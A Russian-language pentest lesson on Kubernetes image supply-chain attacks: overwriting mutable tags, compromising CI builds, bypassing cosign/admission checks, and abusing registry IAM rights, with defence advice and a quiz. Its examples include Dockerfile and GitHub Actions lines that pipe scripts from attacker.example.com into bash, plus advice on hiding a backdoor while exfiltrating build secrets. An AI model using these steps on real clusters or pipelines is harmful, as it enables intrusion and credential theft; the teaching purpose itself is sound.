---
id: cloud-k8s-image-supply-chain
title: "Supply chain образов Kubernetes: реестры, подписи и подмена"
category: cloud
parent: cloud-k8s-security-deep
difficulty: hard
order: 1
tags: [cloud, kubernetes, images, registry, supply-chain, cosign, admission, tag]
prerequisites: [cloud-k8s-security-deep, cloud-containers-docker]
useful_for:
  - "Атаки на supply chain образов"
  - "Пентест container registry"
  - "Обход admission по образам"
estimated_minutes: 50
summary: "Supply chain образов Kubernetes: реестры (ECR/GCR/ACR/Harbor), mutable-теги, подписи (cosign/Sigstore), image pull secrets и admission-политики. Как подменить образ и обойти проверки."
---

## Зачем этот урок

Образы контейнеров — код, который исполняется в кластере. Если атакующий контролирует реестр, тег или процесс сборки, он контролирует и рабочие нагрузки. Supply chain образов — одна из самых «дорогих» атак: подменив образ, можно получить выполнение кода в кластере без эксплуатации уязвимостей. Эта тема связана с подписями (Sigstore/cosign), admission-контроллерами, проверяющими образы, и с правами на реестр (`push`/`delete`).

## Модель supply chain

- **Registry** — хранит образы (ECR, GCR/Artifact Registry, ACR, Docker Hub, Harbor). Доступ через IAM/токены.
- **Tag** — изменяемая метка (`app:latest`). **Digest** — неизменяемый идентификатор (`sha256:...`). Если deployment ссылается на тег, он уязвим к подмене.
- **Image pull secret** — креды для приватного реестра в кластере.
- **Signature** — подпись образа (cosign, Notary). Admission (Kyverno/OPA/Connaisseur) может требовать подпись.
- **SBOM / attestation** — метаданные о содержимом и происхождении.
- **Build** — CI, который собирает и пушит образ; компрометация сборки = компрометация всех деплоев.

## Инструменты и команды

```bash
# Что за образ у пода и по какому идентификатору
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}'
kubectl get pod mypod -o jsonpath='{.status.containerStatuses[0].imageID}'
# docker-pullable://registry/app@sha256:abc...

# Реестр: теги и digest
aws ecr list-images --repository-name app
gcloud artifacts docker tags list us-central1-docker.pkg.dev/proj/repo/app
az acr repository show-tags --name myacr --repository app

# Подписи (cosign)
cosign verify --key cosign.pub registry/app:latest
cosign triangulate registry/app:latest

# Проверка admission-политик
kubectl get validatingwebhookconfigurations
kubectl get clusterpolicies   # Kyverno
```

## Разобранный пример: подмена mutable-тега

Сценарий: у нас есть права `push` в реестр, deployment использует тег `app:latest`.

```bash
# 1. Смотрим, какой образ используется и как часто обновляется
kubectl get deploy app -o jsonpath='{.spec.template.spec.containers[0].image}'
# registry.example.com/app:latest

# 2. Собираем образ с полезной нагрузкой
cat > Dockerfile <<'EOF'
FROM alpine
CMD ["sh","-c","curl http://attacker.example.com/x; sleep infinity"]
EOF
docker build -t registry.example.com/app:latest .
docker push registry.example.com/app:latest
# latest: digest: sha256:def... size: 1234

# 3. Триггерим rollout (или ждём автообновления)
kubectl rollout restart deploy/app
kubectl get pods -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
# registry.example.com/app@sha256:def...
```

Через минуту в кластере работает наш код. Если бы deployment ссылался на digest, подмена была бы невозможна без изменения манифеста. Проверяйте, использует ли кластер теги или digest, и есть ли admission-политика, запрещающая mutable-теги.

## Подписи и их обход

Cosign/Sigstore позволяет подписывать образы и проверять подпись. Admission-контроллер (Connaisseur, Kyverno `verifyImages`) может отклонять неподписанные образы. Обходы:

- **Подмена публичного ключа.** Если ключ проверки хранится в ConfigMap/Secret кластера и у вас есть доступ — замените его на свой.
- **Keyless-подпись.** Если проверка настроена на OIDC-идентичность (например, GitHub Actions), подпись можно сделать из другого репозитория/ветки, если условие слабое.
- **Подпись тега, а не digest.** Если проверяется подпись тега, а не digest, между проверкой и pull возможна гонка (TOCTOU).
- **Пропуск через аннотацию.** Некоторые политики позволяют исключения по label/namespace — проверьте.
- **Private registry mirror.** Если кластер настроен на mirror, подмена источника может обойти проверку.

```bash
# Проверить, что именно проверяется
kubectl get clusterpolicies -o yaml | grep -A20 verifyImages
kubectl get validatingwebhookconfigurations -o yaml | grep -A10 'rules:'
```

## Чек-лист атаки

1. Найти реестры и права на push/delete.
2. Проверить, используют ли deployment'ы теги или digest.
3. Проверить image pull secrets (иногда с широкими правами реестра).
4. Проверить admission-политики по образам.
5. Проверить цепочку сборки (CI) — компрометация сборки сильнее.
6. Проверить подписи и ключи проверки.
7. Проверить, есть ли исключения (namespace/label).

## Обход защит и edge cases

- **Digest pinning.** Если используются digest, подмена тега не сработает — нужен доступ к реестру для перезаписи digest или изменение манифеста.
- **Admission webhook failure policy.** `failurePolicy: Ignore` при недоступности webhook пропускает образы — можно «уронить» webhook.
- **Image pull policy.** `Always` vs `IfNotPresent`: при `IfNotPresent` старый образ остаётся на узле.
- **Registry с immutable tags.** Запрещает перезапись тега — тогда нужен новый тег + изменение deployment.
- **Кэш на узле.** Даже при подмене образа на узле может остаться старая копия.

## Частые ошибки и подводные камни

- Считать, что «образы подписаны» = безопасно: проверка может быть отключена.
- Не проверить права на реестр: часто роль может пушить.
- Игнорировать CI как более сильный вектор.
- Забыть про failurePolicy webhook.
- Путать подпись тега и digest.

## Защита и детект

- Использовать digest вместо тегов; запретить mutable-теги admission-политикой.
- Подписывать образы (cosign) и проверять подпись в admission (Kyverno/Connaisseur).
- Ограничить push/delete в реестр; включить immutability.
- Защитить ключи проверки (не в изменяемых ConfigMap).
- Аудит: логи реестра, admission-решений, kubelet pull.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — deployment на `:latest` без проверки. Второй — права push у широкой роли. Третий — подпись не проверяется. Четвёртый — ключ проверки в изменяемом ConfigMap. Пятый — failurePolicy Ignore. Все они позволяют подменить образ.

## Практическое задание

1. Создайте реестр и deployment на теге `:latest`.
2. Подмените образ и перезапустите deployment.
3. Настройте Kyverno verifyImages и проверьте отклонение неподписанного образа.
4. Переключите deployment на digest и повторите подмену тега.

## Что дальше / решение

Подмена образа даёт выполнение кода в кластере. Дальше — эскалировать (SA-токены, escape). Зафиксируйте путь «push в реестр → подмена → код в поде» в графе. Если используется digest и подпись проверяется — ищите CI или ключ проверки.

## Разобранный пример 2: компрометация сборки

Компрометация CI/CD сильнее подмены реестра: сборка создаёт образы для множества сервисов, и все они окажутся заражёнными.

```bash
# В workflow сборки (GitHub Actions) добавляем шаг exfil/backdoor
# .github/workflows/build.yml
# - run: |
#     curl -s http://attacker.example.com/stage.sh | bash
#     docker build -t $REGISTRY/app:$TAG .
#     docker push $REGISTRY/app:$TAG

# Либо правим Dockerfile: добавляем RUN, который внедряет бэкдор
# FROM node:20
# RUN curl -s http://attacker.example.com/x.sh | bash
```

Секреты сборки (креды реестра, облачные креды) доступны на этапе build. Их можно выгрузить и использовать отдельно, а образ оставить «рабочим», чтобы не вызвать подозрений. Проверяйте цепочку: кто имеет доступ к CI, какие секреты там лежат, есть ли подпись и кто её проверяет. Если образы подписываются в CI, но ключ подписи лежит там же — компрометация сборки позволяет подписать заражённый образ.

## Реестр как цель: ECR/GCR/ACR

Доступ к реестру определяется IAM. Часто роли приложений имеют `ecr:GetAuthorizationToken` и `ecr:BatchGetImage`, а иногда и `ecr:PutImage`. Проверяйте права на push/delete.

```bash
# ECR: права и образы
aws ecr get-authorization-token
aws ecr describe-repositories --query 'repositories[].repositoryUri'
aws ecr list-images --repository-name app
aws ecr put-image --repository-name app --image-tag latest --image-manifest file://manifest.json

# GCR/Artifact Registry
gcloud artifacts repositories list
gcloud artifacts docker images list us-central1-docker.pkg.dev/proj/repo

# ACR
az acr repository list --name myacr
az acr login --name myacr && docker push myacr.azurecr.io/app:latest
```

Если у вас есть `PutImage`, вы можете подменить образ напрямую, без доступа к CI. Если есть `DeleteRepository`/`DeleteImage` — это DoS (но опасно). Проверяйте также lifecycle policies: они могут автоматически удалять старые теги, что влияет на деплой. И не забывайте про image pull secrets в кластере — иногда они имеют более широкие права, чем нужно.

## Квиз

```quiz
- question: "Почему mutable-тег опасен?"
  options:
    - "Его можно перезаписать, и deployment подтянет новый образ"
    - "Он неизменяем"
    - "Он шифруется"
    - "Он требует MFA"
  answer: 0
  explanation: "Тег можно перезаписать; digest — нет."
- question: "Что проверяет cosign verify?"
  options:
    - "Подпись образа публичным ключом"
    - "Сетевые политики"
    - "RBAC"
    - "Лимиты ресурсов"
  answer: 0
  explanation: "cosign проверяет криптографическую подпись образа."
- question: "Что даёт failurePolicy: Ignore у admission webhook?"
  options:
    - "При недоступности webhook ресурс пропускается"
    - "Webhook всегда отклоняет"
    - "Webhook шифрует"
    - "Webhook логирует"
  answer: 0
  explanation: "Ignore пропускает запрос, если webhook не ответил — обход проверки."
- question: "Почему CI — более сильный вектор, чем реестр?"
  options:
    - "Компрометация сборки затрагивает все образы, которые она производит"
    - "CI медленнее"
    - "CI не имеет прав"
    - "CI шифрует образы"
  answer: 0
  explanation: "Сборка создаёт образы для многих сервисов — эффект шире."
```

## Где пригодится

- **Пентест k8s:** подмена образов.
- **Supply chain security:** подписи и admission.
- **Red team:** код в кластере без CVE.
- **DevSecOps:** защита реестров и сборки.
